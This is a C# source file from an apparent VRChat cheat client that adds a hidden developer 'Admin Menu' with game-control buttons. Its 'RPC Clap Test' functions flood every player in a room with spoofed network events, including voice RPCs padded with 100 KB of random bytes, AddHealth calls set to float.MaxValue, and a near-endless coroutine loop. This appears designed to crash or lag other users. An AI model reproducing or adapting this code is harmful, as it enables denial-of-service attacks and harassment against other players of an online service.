namespace AstroClient
{
	using AstroClient.ConsoleUtils;
	using AstroClient.variables;
	using RubyButtonAPI;
	using System.Diagnostics;
	using System.IO;
	using UnityEngine;
	using DayClientML2.Utility.Extensions;
	using VRC.SDKBase;
	using static VRC.SDKBase.VRC_EventHandler;
	using Il2CppSystem.Text;
	using System.Threading;
	using Il2CppSystem.Collections;
	using MelonLoader;
	using DayClientML2.Utility;
	using System.Management;

	/// <summary>
	/// Cheeto's temporary UI for new/wip features
	/// </summary>
	public class CheetosUI : GameEvents
	{
		public QMNestedButton MainButton { get; private set; }

		public QMScrollMenu MainScroller { get; private set; }

		public QMSingleButton CloseButton { get; private set; }

		public QMSingleButton RestartButton { get; private set; }

		public QMSingleButton DisconectButton { get; private set; }

		public QMSingleButton ReconnectButton { get; private set; }

		public override void VRChat_OnUiManagerInit()
		{
			MainButton = new QMNestedButton("ShortcutMenu", 5, 3, "Admin Menu", "AstroClient's Admin Menu", null, null, null, null, true);
			MainScroller = new QMScrollMenu(MainButton);
			CloseButton = new QMSingleButton(MainButton, 0, 0, "Close Game", () => { Process.GetCurrentProcess().Kill(); }, "Close the game");
			RestartButton = new QMSingleButton(MainButton, 0, 1, "Restart Game", () =>
			{
				Process.Start(Directory.GetParent(Application.dataPath) + "\\VRChat.exe");
				Process.GetCurrentProcess().Kill();
			}, "Restart the game");
			DisconectButton = new QMSingleButton(MainButton, 1, 0, "Disconnect", () => { AstroNetworkClient.Client.Disconnect(false); }, "Disconnect");
			ReconnectButton = new QMSingleButton(MainButton, 1, 1, "Reconnect", () => { AstroNetworkClient.Client.Disconnect(true); }, "Reconnect");
			ReconnectButton = new QMSingleButton(MainButton, 3, 2, "Photon", () => { PrintPhotonPlayers(); }, "Photon");
			ReconnectButton = new QMSingleButton(MainButton, 4, 0, "RPC Test #1", () => { RPCClapTest1(); }, "RPC");
			ReconnectButton = new QMSingleButton(MainButton, 4, 0, "RPC Test #2", () => { RPCClapTest2(); }, "RPC");
			ReconnectButton = new QMSingleButton(MainButton, 4, 2, "RPC Test #3", () => { RPCClapTest3(); }, "RPC");

			if (!Bools.IsDeveloper)
			{
				MainButton.getMainButton().setActive(false);
			}
		}

		public VRC_EventHandler handler;

		private byte[] GetByteArray(int sizeInKb)
		{
			System.Random rnd = new System.Random();
			byte[] b = new byte[sizeInKb * 1024]; // convert kb to byte
			rnd.NextBytes(b);
			return b;
		}

		public void RPCClapTest3()
		{
			if (handler == null)
			{
				DoHandlerThing();
			}

			int i = 0;
			while (i <= 100)
			{
				foreach (var player in WorldUtils.GetAllPlayers0())
				{
					handler.TriggerEvent(new VrcEvent
					{
						EventType = VrcEventType.SendRPC,
						Name = "USpeak",
						ParameterObject = player.gameObject,
						ParameterInt = Utils.LocalPlayer.playerId,
						ParameterFloat = float.MaxValue,
						ParameterString = "Health",
						ParameterBoolOp = VrcBooleanOp.Unused,
						ParameterBytes = GetByteArray(100)
					}, VrcBroadcastType.AlwaysUnbuffered, player.gameObject, 0f);
				}
				Thread.Sleep(1);
				i++;
			}
		}

		public void RPCClapTest2()
		{
			if (handler == null)
			{
				DoHandlerThing();
			}

			int i = 0;

			while (i <= 100)
			{
				foreach (var player in WorldUtils.GetAllPlayers0())
				{
					handler.TriggerEvent(new VrcEvent
					{
						EventType = VrcEventType.SendRPC,
						Name = "AddHealth",
						ParameterObject = player.gameObject,
						ParameterInt = Utils.LocalPlayer.playerId,
						ParameterFloat = float.MaxValue,
						ParameterString = "Health",
						ParameterBoolOp = VrcBooleanOp.Unused,
						ParameterBytes = new byte[] { byte.MaxValue }
					}, VrcBroadcastType.AlwaysUnbuffered, VRCPlayer.field_Internal_Static_VRCPlayer_0.gameObject, 0f);
				}
				Thread.Sleep(1);
				i++;
			}
		}

		public void RPCSendMessage(string msg)
		{
			int i = 0;
			int i2 = 0;

			StringBuilder stringBuilder = new StringBuilder();
			
			
			//while (i2 <= 1000)
			//{
			//	stringBuilder.AppendLine("Test");
			//	i2++;
			//}

				//handler.TriggerEvent(new VrcEvent
				//{
				//	EventType = VrcEventType.SendRPC,
				//	Name = "SendRPC",
				//	ParameterObject = handler.gameObject,
				//	ParameterInt = Utils.LocalPlayer.playerId,
				//	ParameterFloat = 0f,
				//	ParameterString = "UdonSyncRunProgramAsRPC",
				//	ParameterBoolOp = VrcBooleanOp.Unused,
				//	ParameterBytes = Networking.EncodeParameters(new Il2CppSystem.Object[] { "boop" })
				//}, VrcBroadcastType.AlwaysUnbuffered, VRCPlayer.field_Internal_Static_VRCPlayer_0.gameObject, 0f);
			//foreach (var player in WorldUtils.GetAllPlayers0())
			//{
			//	handler.TriggerEvent(new VrcEvent
			//	{
			//		EventType = VrcEventType.SendMessage,
			//		Name = null,
			//		ParameterObject = null,
			//		ParameterInt = 0,
			//		ParameterFloat = 0f,
			//		ParameterString = null,
			//		ParameterBoolOp = VrcBooleanOp.Unused,
			//		ParameterBytes = null
			//	}, VrcBroadcastType.AlwaysUnbuffered, Utils.LocalPlayer.gameObject, float.MinValue);
			//}
		}

		private static System.Random random = new System.Random();

		private string GetRandomName()
		{
			int rand = random.Next(0, 6);

			switch(rand)
			{
				case 0:
					return "USpeak";
				case 1:
					return "AddHealth";
				case 2:
					return "TeleportTo";
				case 3:
					return "Indicator";
				case 4:
					return "AddDamage";
				case 5:
					return "DestroyObject";
				case 6:
					return "Shit";
				case 7:
					return "Cock";
				case 8:
					return null;
			}
			return "";
		}

		private string GetRandomFunction()
		{
			int rand = random.Next(0, 6);

			switch (rand)
			{
				case 0:
					return "ReceiveVoiceStatsSyncRPC";
				case 1:
					return "PhotoCapture";
				case 2:
					return "InformOfBadConnection";
				case 3:
					return "SuckMyPepe";
				case 4:
					return "Smeckles";
				case 5:
					return "Gringo";
				case 6:
					return null;
			}
			return "";
		}

		public System.Collections.IEnumerator Clap1()
		{
			for (int i = 0; i < int.MaxValue; i++)
			{
				RPCSendMessage("Test");
				yield return null;
			}
			yield break;
		}

		public void RPCClapTest1()
		{
			if (handler == null)
			{
				DoHandlerThing();
			}

			MelonLoader.MelonCoroutines.Start(Clap1());
		}

		public void DoHandlerThing()
		{
			handler = Object.FindObjectOfType<VRC_EventHandler>();
			if (handler != null)
			{
				ModConsole.Log("VRC_EventHandler found!");
			}
		}

		public void PrintPhotonPlayers()
		{
			var room = Utils.LoadBalancingPeer.prop_Room_0;

			if (room == null)
			{
				ModConsole.Log("Room was null");
				return;
			}

			var players = room.prop_Dictionary_2_Int32_Player_0;

			if (players == null)
			{
				ModConsole.Log("Players was null");
				return;
			}

			foreach (var player in players)
			{
				ModConsole.Log($"Key: {player.Key}");
				ModConsole.Log($"Value: {player.Value.GetDisplayName()}");
			}
		}

		public override void OnWorldReveal(string id, string name, string asseturl)
		{
		}
	}
}